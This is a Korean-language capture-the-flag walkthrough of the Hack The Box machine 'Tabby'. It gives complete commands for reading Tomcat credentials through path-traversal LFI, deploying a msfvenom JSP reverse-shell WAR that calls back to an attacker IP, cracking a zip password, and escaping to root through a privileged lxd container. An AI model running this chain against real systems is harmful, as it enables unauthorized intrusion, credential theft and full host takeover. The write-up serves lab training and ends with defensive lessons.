# HTB - Tabby

## 머신 정보

|항목|내용|
|---|---|
|이름|Tabby|
|난이도|Easy|
|OS|Linux (Ubuntu)|
|IP|10.129.191.203|
|주요 취약점|LFI + Tomcat WAR 업로드|
|Privesc|lxd 그룹 컨테이너 탈출|
|태그|`LFI` `Tomcat` `WAR` `lxd` `PasswordReuse` `Linux`|

---

## 공격 흐름 요약

```
nmap 포트 스캔
→ 80 (Apache), 8080 (Tomcat)
→ /etc/hosts에 megahosting.htb 추가
→ LFI로 tomcat-users.xml 읽기
→ 패스워드 획득 (tomcat:$3cureP4s5w0rd123!)
→ WAR 파일 배포로 RCE
→ tomcat 쉘 획득
→ zip 파일 크랙 (admin@it)
→ su ash로 유저 전환
→ lxd 컨테이너로 root 획득
```

---

## 1. 정찰 (Reconnaissance)

### 1.1 Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.191.203
```

**결과:**

|PORT|SERVICE|
|---|---|
|22/tcp|SSH|
|80/tcp|HTTP (Apache)|
|8080/tcp|HTTP (Tomcat)|

### 1.2 /etc/hosts 설정

```bash
echo "10.129.191.203 megahosting.htb" | sudo tee -a /etc/hosts
```

### 1.3 웹 서비스 확인

```
http://megahosting.htb/         → 회사 웹사이트
http://megahosting.htb:8080/    → Apache Tomcat
```

### 1.4 LFI 취약점 발견

80 포트 웹사이트에서 data breach 관련 링크:

```
http://megahosting.htb/news.php?file=statement
```

`file` 파라미터 → **LFI 취약점!**

---

## 2. LFI로 Tomcat 크레덴셜 획득

### tomcat-users.xml 읽기

```bash
curl "http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml"
```

**결과:**

```xml
<role rolename="admin-gui"/>
<role rolename="manager-script"/>
<user username="tomcat" password="$3cureP4s5w0rd123!" roles="admin-gui,manager-script"/>
```

|항목|내용|
|---|---|
|Username|tomcat|
|Password|$3cureP4s5w0rd123!|
|Roles|admin-gui, manager-script|

> `manager-script` 권한 → `/manager/text` 텍스트 인터페이스 접근 가능

---

## 3. 초기 접근 (Initial Access)

### 3.1 Tomcat Manager 연결 확인

```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.129.191.203:8080/manager/text/list
```

### 3.2 WAR 웹쉘 생성

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.240 LPORT=4444 -f war > shell.war
```

### 3.3 WAR 파일 배포

```bash
curl -u 'tomcat:$3cureP4s5w0rd123!' \
"http://10.129.191.203:8080/manager/text/deploy?path=/shell" \
--upload-file shell.war
```

### 3.4 리스너 + 트리거

```bash
# nc 리스너
nc -lvnp 4444

# 웹쉘 트리거
curl http://10.129.191.203:8080/shell/
```

→ **tomcat 유저 쉘 연결!**

---

## 4. 패스워드 크랙 (tomcat → ash)

### 4.1 zip 파일 발견

```bash
find / -name "*.zip" 2>/dev/null
# → /var/www/html/files/16162020_backup.zip
```

### 4.2 Kali로 파일 전송

```bash
# 타겟에서 base64 인코딩
base64 /var/www/html/files/16162020_backup.zip

# Kali에서 디코딩
echo "<base64>" | base64 -d > 16162020_backup.zip
```

### 4.3 zip 패스워드 크랙

```bash
zip2john 16162020_backup.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**결과:** `admin@it`

### 4.4 ash 유저로 전환

```bash
# tomcat 쉘에서
python3 -c 'import pty;pty.spawn("/bin/bash")'
su - ash
# PW: admin@it
```

---

## 5. User Flag

```bash
cat ~/user.txt
```

---

## 6. 권한 상승 (Privilege Escalation) - lxd

### 6.1 lxd 그룹 확인

```bash
id
# uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

→ **lxd 그룹 멤버!** → 컨테이너로 host root 파일시스템 접근 가능

### 6.2 Alpine 이미지 준비 (Kali에서)

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sudo ./build-alpine

# HTTP 서버
python3 -m http.server 8000
```

### 6.3 이미지 업로드 (ash 쉘에서)

```bash
wget http://10.10.17.240:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import alpine*.tar.gz --alias myimage
lxc image list
```

### 6.4 LXD 초기화

```bash
lxd init --auto
```

### 6.5 컨테이너 생성 및 실행

```bash
# 컨테이너 생성 (privileged 모드)
lxc init myimage mycontainer -c security.privileged=true

# 호스트 파일시스템 마운트
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

# 컨테이너 시작
lxc start mycontainer

# 컨테이너 쉘 접속
lxc exec mycontainer /bin/sh
```

### 6.6 root 파일시스템 접근

```bash
# 컨테이너 안에서
ls /mnt/root/root/
cat /mnt/root/root/root.txt
```

---

## 7. Root Flag

```bash
cat /mnt/root/root/root.txt
```

---

## 8. 정리 및 교훈

### 취약점 체인

```
LFI → tomcat-users.xml 읽기
→ Tomcat Manager Text API로 WAR 배포
→ tomcat 쉘 획득
→ zip 크랙으로 ash 패스워드 획득
→ lxd 컨테이너로 root 파일시스템 접근
→ root flag 획득
```

### 핵심 교훈

- **LFI** → 설정 파일 노출 위험 (tomcat-users.xml)
- **Tomcat Manager** 외부 노출 금지
- **패스워드 재사용** 금지 (zip PW = 유저 PW)
- **lxd 그룹** 멤버십은 사실상 root 권한과 동일
- `security.privileged=true` → 컨테이너가 root로 호스트 파일시스템 접근

### Tomcat Manager 경로

|경로|권한|용도|
|---|---|---|
|`/manager/html`|admin-gui|GUI 인터페이스|
|`/manager/text`|manager-script|텍스트/API 인터페이스|
|`/manager/text/list`|manager-script|앱 목록|
|`/manager/text/deploy`|manager-script|WAR 배포|

---

## 참고

|항목|링크|
|---|---|
|lxd Privesc|https://www.hackingarticles.in/lxd-privilege-escalation/|
|Alpine Builder|https://github.com/saghul/lxd-alpine-builder|
|Tomcat Manager Text|https://tomcat.apache.org/tomcat-9.0-doc/manager-howto.html|